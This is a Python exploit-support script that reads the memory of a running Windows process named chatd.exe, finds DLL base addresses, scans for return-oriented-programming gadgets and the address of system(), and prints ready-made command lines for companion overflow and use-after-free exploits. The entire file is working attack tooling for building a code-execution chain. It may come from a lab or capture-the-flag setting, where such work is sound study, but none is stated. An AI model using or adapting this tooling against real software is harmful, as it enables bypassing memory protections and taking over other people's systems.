#!/usr/bin/env python3
"""
find_dll_base.py -- find loaded DLL bases in a Windows process

run this ON the target Windows machine to discover DLL base addresses
for chatd.exe. outputs addresses suitable for --ucrt-base or --msvcrt-base.

also searches loaded DLLs for ROP gadgets needed by the overflow exploit:
  pop rax; ret    (58 c3)
  pop rcx; ret    (59 c3)
  pop rdx; ret    (5a c3)
  mov [rcx], rax; ret  (48 89 01 c3)

and locates system() in the CRT DLL.

usage:
  python find_dll_base.py                    # find chatd.exe automatically
  python find_dll_base.py --pid 1234         # specify PID
  python find_dll_base.py --json             # machine-readable output
  python find_dll_base.py --dll ucrtbase.dll # search specific DLL only

requires: Windows, Python 3.6+, no extra packages (uses ctypes)
"""

import argparse
import ctypes
import ctypes.wintypes
import json
import os
import struct
import sys

# windows API constants
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
LIST_MODULES_ALL = 0x03
MAX_PATH = 260

kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi


def find_chatd_pid():
    """find chatd.exe PID using CreateToolhelp32Snapshot."""
    TH32CS_SNAPPROCESS = 0x02

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", ctypes.wintypes.DWORD),
            ("cntUsage", ctypes.wintypes.DWORD),
            ("th32ProcessID", ctypes.wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID", ctypes.wintypes.DWORD),
            ("cntThreads", ctypes.wintypes.DWORD),
            ("th32ParentProcessID", ctypes.wintypes.DWORD),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", ctypes.wintypes.DWORD),
            ("szExeFile", ctypes.c_char * MAX_PATH),
        ]

    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == ctypes.wintypes.HANDLE(-1).value:
        return None

    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

    pids = []
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            name = pe.szExeFile.decode("utf-8", errors="replace").lower()
            if "chatd" in name:
                pids.append(pe.th32ProcessID)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break

    kernel32.CloseHandle(snap)
    return pids[0] if pids else None


def enum_modules(pid):
    """enumerate loaded modules (DLLs) for a process."""
    hproc = kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not hproc:
        print(f"  ! couldn't open PID {pid} (run as admin?)", file=sys.stderr)
        return []

    hmod_array = (ctypes.wintypes.HMODULE * 1024)()
    needed = ctypes.wintypes.DWORD()

    if not psapi.EnumProcessModulesEx(
            hproc, ctypes.byref(hmod_array),
            ctypes.sizeof(hmod_array), ctypes.byref(needed),
            LIST_MODULES_ALL):
        kernel32.CloseHandle(hproc)
        return []

    count = needed.value // ctypes.sizeof(ctypes.wintypes.HMODULE)
    modules = []

    for i in range(count):
        hmod = hmod_array[i]
        name_buf = ctypes.create_string_buffer(MAX_PATH)
        psapi.GetModuleFileNameExA(hproc, hmod, name_buf, MAX_PATH)

        class MODULEINFO(ctypes.Structure):
            _fields_ = [
                ("lpBaseOfDll", ctypes.c_void_p),
                ("SizeOfImage", ctypes.wintypes.DWORD),
                ("EntryPoint", ctypes.c_void_p),
            ]

        mi = MODULEINFO()
        psapi.GetModuleInformation(
            hproc, hmod, ctypes.byref(mi), ctypes.sizeof(mi))

        modules.append({
            "name": name_buf.value.decode("utf-8", errors="replace"),
            "base": mi.lpBaseOfDll,
            "size": mi.SizeOfImage,
        })

    kernel32.CloseHandle(hproc)
    return modules


def read_module_text(pid, base, size):
    """read the .text section of a module via ReadProcessMemory."""
    hproc = kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not hproc:
        return None

    buf = ctypes.create_string_buffer(size)
    n_read = ctypes.c_size_t()
    ok = kernel32.ReadProcessMemory(
        hproc, ctypes.c_void_p(base), buf, size, ctypes.byref(n_read))
    kernel32.CloseHandle(hproc)

    if not ok:
        return None
    return buf.raw[:n_read.value]


def find_gadgets(data, base):
    """search raw bytes for ROP gadgets. returns dict of gadget->address."""
    gadgets = {}

    for i in range(len(data) - 1):
        pair = data[i:i+2]
        if pair == b"\x58\xc3" and "pop_rax" not in gadgets:
            gadgets["pop_rax"] = base + i
        elif pair == b"\x59\xc3" and "pop_rcx" not in gadgets:
            gadgets["pop_rcx"] = base + i
        elif pair == b"\x5a\xc3" and "pop_rdx" not in gadgets:
            gadgets["pop_rdx"] = base + i

    for i in range(len(data) - 3):
        if data[i:i+4] == b"\x48\x89\x01\xc3":
            if "mov_cr_a" not in gadgets:
                gadgets["mov_cr_a"] = base + i

    return gadgets


def find_export(pid, base, size, name):
    """find an exported function by walking the PE export table in memory."""
    data = read_module_text(pid, base, min(size, 0x200000))
    if data is None or len(data) < 0x100:
        return None

    # PE header
    pe_off = struct.unpack_from("<I", data, 0x3c)[0]
    if pe_off + 0x88 + 8 > len(data):
        return None

    # export directory RVA and size
    export_rva = struct.unpack_from("<I", data, pe_off + 0x88)[0]
    export_size = struct.unpack_from("<I", data, pe_off + 0x8c)[0]
    if export_rva == 0:
        return None

    if export_rva + 40 > len(data):
        return None

    num_funcs = struct.unpack_from("<I", data, export_rva + 20)[0]
    num_names = struct.unpack_from("<I", data, export_rva + 24)[0]
    addr_rva = struct.unpack_from("<I", data, export_rva + 28)[0]
    name_rva = struct.unpack_from("<I", data, export_rva + 32)[0]
    ord_rva = struct.unpack_from("<I", data, export_rva + 36)[0]

    name_bytes = name.encode("ascii")

    for i in range(num_names):
        noff = name_rva + i * 4
        if noff + 4 > len(data):
            break
        n_rva = struct.unpack_from("<I", data, noff)[0]
        if n_rva + len(name_bytes) + 1 > len(data):
            continue

        s = data[n_rva:n_rva + len(name_bytes) + 1]
        if s == name_bytes + b"\x00":
            ooff = ord_rva + i * 2
            if ooff + 2 > len(data):
                break
            ordinal = struct.unpack_from("<H", data, ooff)[0]
            aoff = addr_rva + ordinal * 4
            if aoff + 4 > len(data):
                break
            func_rva = struct.unpack_from("<I", data, aoff)[0]
            return base + func_rva

    return None


CRT_NAMES = ["ucrtbase.dll", "msvcrt.dll", "ucrtbased.dll", "msvcrtd.dll"]


def main():
    parser = argparse.ArgumentParser(
        description="find DLL bases and ROP gadgets in chatd.exe")
    parser.add_argument("--pid", type=int, default=None)
    parser.add_argument("--dll", default=None,
                        help="search only this DLL (default: all CRT DLLs)")
    parser.add_argument("--json", action="store_true",
                        help="output machine-readable JSON")
    args = parser.parse_args()

    pid = args.pid
    if pid is None:
        pid = find_chatd_pid()
        if pid is None:
            print("couldn't find chatd.exe. pass --pid manually.",
                  file=sys.stderr)
            return 1

    if not args.json:
        print(f"\n  chatd.exe PID: {pid}\n")

    modules = enum_modules(pid)
    if not modules:
        print("couldn't enumerate modules.", file=sys.stderr)
        return 1

    target_dlls = [args.dll.lower()] if args.dll else CRT_NAMES
    results = {}

    for mod in modules:
        basename = os.path.basename(mod["name"]).lower()
        if basename not in target_dlls:
            continue

        base = mod["base"]
        size = mod["size"]

        if not args.json:
            print(f"  {basename}")
            print(f"    base: 0x{base:016x}")
            print(f"    size: 0x{size:x}")

        data = read_module_text(pid, base, size)
        if data is None:
            if not args.json:
                print("    (couldn't read memory)")
            continue

        gadgets = find_gadgets(data, base)
        system_addr = find_export(pid, base, size, "system")

        entry = {
            "base": base,
            "size": size,
            "gadgets": gadgets,
        }
        if system_addr:
            entry["system"] = system_addr
            gadgets["system"] = system_addr

        results[basename] = entry

        if not args.json:
            for gname, gaddr in gadgets.items():
                rva = gaddr - base
                print(f"    {gname}: 0x{gaddr:016x} (RVA 0x{rva:x})")
            if system_addr:
                rva = system_addr - base
                print(f"    system: 0x{system_addr:016x} (RVA 0x{rva:x})")
            else:
                print("    system: not found")
            print()

    if args.json:
        out = {"pid": pid, "dlls": {}}
        for name, info in results.items():
            out["dlls"][name] = {
                "base": f"0x{info['base']:x}",
                "size": info["size"],
                "gadgets": {k: f"0x{v:x}" for k, v in info["gadgets"].items()},
            }
            if "system" in info:
                out["dlls"][name]["system"] = f"0x{info['system']:x}"
        print(json.dumps(out, indent=2))

    # pick the best DLL and print exploit command line
    best = None
    for name in ["ucrtbase.dll", "msvcrt.dll", "ucrtbased.dll", "msvcrtd.dll"]:
        if name in results:
            r = results[name]
            if all(g in r["gadgets"] for g in
                   ["pop_rax", "pop_rcx", "mov_cr_a"]) and "system" in r:
                best = (name, r)
                break

    if best and not args.json:
        name, r = best
        base = r["base"]
        print(f"  recommended: use {name} (base 0x{base:016x})")
        flag = "--ucrt-base" if "ucrt" in name else "--msvcrt-base"
        print(f"  exploit flag: {flag} 0x{base:x}")
        print()
        print(f"  overflow: python chat_win_cmd_overflow.py {flag} 0x{base:x}")
        print(f"  uaf:      python chat_win_uaf.py --system-addr 0x{r['system']:x}")

    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
